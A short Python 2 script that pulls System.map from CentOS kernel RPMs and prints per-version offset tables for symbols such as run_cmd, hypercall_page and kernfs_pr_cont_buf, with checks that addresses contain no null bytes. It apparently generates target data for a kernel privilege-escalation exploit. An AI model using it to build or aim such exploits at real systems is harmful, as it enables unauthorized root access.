#!/usr/bin/python

import glob
import os
import re
import struct

def natsort(l):
	conv = lambda text: int(text) if text.isdigit() else text.lower()
	alnum_key = lambda key: [conv(c) for c in re.split(r'(\d+)', key)]
	return sorted(l, key=alnum_key, reverse=True)


# kernel-core-4.18.0-147.0.3.el8_1.x86_64.rpm
def centos():
	vers = []
	for fn in natsort(glob.glob("kernel-core-*.rpm")):
		m = re.findall(r"kernel-core-(.*?\.x86_64)\.rpm", fn)

		ver = m[0]

		if ver in vers: raise "Dupes?"
		vers.append(ver)

		data = os.popen("rpm2cpio %s 2>/dev/null|cpio -i --to-stdout ./lib/modules/%s/System.map 2>/dev/null" % (fn, ver)).read()

		syms = {}
		for l in data.splitlines():
			addr, type, name = l.split()
			syms[name] = int(addr, 16)

		if "_text" not in syms:
			continue

		t = syms["_text"]
		a = syms["hypercall_page"] - t
		b = syms["run_cmd"] - t
		c = syms["kernfs_pr_cont_buf"] - t
		d = syms["__rb_free_aux"] - t
		e = syms["kmem_cache_size"] - t

		if b & 0xff == 0: b += 5
		if d & 0xff == 0: d += 5

		assert "\x00" not in struct.pack("<Q", t + b)
		assert "\x00" not in struct.pack("<Q", t + d)
		assert "\x00" not in struct.pack("<Q", t + c + 224 + 8)


		print '\t{"%s", 0x%.8x, 0x%.8x, 0x%.8x, 0x%.8x, 0x%.8x},' % (ver, a, b, c, d, e)

centos()
